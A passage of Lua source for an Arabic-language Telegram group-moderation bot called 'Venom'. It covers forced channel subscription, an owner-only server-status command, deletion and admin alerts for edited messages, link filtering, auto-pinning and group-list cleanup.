if DevAbs:get(Venom.."Abs:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(Venom.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "𖠧︙عذرا لاتستطيع استخدام البوت !\n𖠧︙عليك الاشتراك في القناة اولا :"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لم يتم تعيين قناة الاشتراك الاجباري \n𖠧︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source Venom     --
if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙Channel ↬ [@venom_source]', 1, 'md')    
end 
--     Source Venom     --
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
if not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '𖠧︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source Venom     --
VenomFiles(msg)
--     Source Venom     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevAbs:incr(Venom..'Abs:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'الميديا'
if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
elseif result.content_.ID == "MessageSticker" then Media = 'الملصق'
elseif result.content_.ID == "MessageVoice" then Media = 'البصمه'
elseif result.content_.ID == "MessageAudio" then Media = 'الصوت'
elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local absname = '𖠧︙العضو ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local absid = '𖠧︙ايديه ↫ `'..dp.id_..'`'
local abstext = '𖠧︙قام بالتعديل على '..Media
local abstxt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=0 , #admins do 
if not abbas.members_[i].bot_info_ then
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, absname..'\n'..absid..'\n'..abstext..text..abstxt,0,'md') 
end
end,nil)
end
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source Venom     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevAbs:get(Venom..'Abs:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevAbs:del(Venom..'Abs:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbs:del(Venom..'Abs:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbs:del(Venom..'Abs:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevAbs:del(Venom..'Abs:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source Venom     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevAbs:smembers(Venom..'Abs:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevAbs:smembers(Venom..'Abs:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Venom,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevAbs:srem(Venom..'Abs:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbs:srem(Venom..'Abs:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbs:srem(Venom..'Abs:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevAbs:srem(Venom..'Abs:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(Venom..'Abs:Groups',v)  
end end,nil) end
end
--     Source Venom     --
end 
------------------------------------------------
-- This Source Was Developed By (ABS) @wKwvv.--
--   This Is The Source Channel @venom_source .   --
--                - Venom -                 --
--        -- https://t.me/venom_source --         --
------------------------------------------------ 
